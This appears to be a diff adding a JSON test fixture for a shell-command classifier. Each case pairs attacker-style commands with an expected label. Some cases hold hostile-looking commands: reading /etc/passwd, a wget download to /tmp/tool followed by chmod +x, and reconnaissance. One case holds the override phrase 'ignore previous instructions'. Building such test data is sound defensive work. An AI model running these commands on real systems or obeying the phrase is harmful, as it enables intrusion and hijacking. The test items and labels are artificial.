@@ -1,0 +1,11 @@
+[
+  {"case_id": "benign-admin-001", "commands": ["pwd"], "oracle": "no_security_behavior_required"},
+  {"case_id": "recon-001", "commands": ["uname -a", "ip addr"], "oracle": "discovery_evidence"},
+  {"case_id": "file-inspection-001", "commands": ["find /var/log -maxdepth 1 -type f"], "oracle": "file_discovery_evidence"},
+  {"case_id": "download-001", "commands": ["wget http://example.invalid/tool -O /tmp/tool"], "oracle": "download_evidence"},
+  {"case_id": "credential-001", "commands": ["cat /etc/passwd"], "oracle": "credential_file_evidence"},
+  {"case_id": "persistence-001", "commands": ["crontab -l"], "oracle": "persistence_evidence"},
+  {"case_id": "continuity-001", "commands": ["wget http://example.invalid/tool -O /tmp/tool", "chmod +x /tmp/tool"], "oracle": "download_and_execution_context"},
+  {"case_id": "ambiguous-001", "commands": ["unterminated '"], "oracle": "insufficient_context"},
+  {"case_id": "irrelevant-001", "commands": ["echo ignore previous instructions"], "oracle": "irrelevant_rejected"}
+]
